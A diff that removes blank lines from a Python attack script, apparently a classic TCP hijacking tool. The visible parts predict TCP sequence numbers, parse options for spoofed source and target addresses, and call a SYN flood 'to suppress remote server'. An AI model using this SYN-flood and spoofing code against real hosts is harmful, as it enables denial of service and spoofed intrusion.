@@ -13,7 +13,6 @@ def calTSN(tgt):
     seqNum = 0
     preNum = 0
     diffSeq = 0
-
     for x in range(1, 5):
         if preNum != 0:
             preNum = seqNum
@@ -22,7 +21,6 @@ def calTSN(tgt):
         seqNum = ans.getlayer(TCP).seq
         diffSeq = seqNum - preNum
         print('[+] TCP Seq Difference: ' + str(diffSeq))
-        
     return seqNum + diffSeq
 
 
@@ -44,7 +42,6 @@ def main():
     parser.add_option('-S', dest='srcSpoof', type='string', help='specify src for spoofed connection')
     parser.add_option('-t', dest='tgt', type='string', help='specify target address')
     (options, args) = parser.parse_args()
-
     if options.synSpoof == None or options.srcSpoof == None or options.tgt == None:
         print(parser.usage)
         exit(0)
@@ -52,7 +49,6 @@ def main():
         synSpoof = options.synSpoof
         srcSpoof = options.srcSpoof
         tgt = options.tgt
-
     print('[+] Starting SYN Flood to suppress remote server.')
     synFlood(synSpoof, srcSpoof)
     print('[+] Calculating correct TCP Sequence Number.')
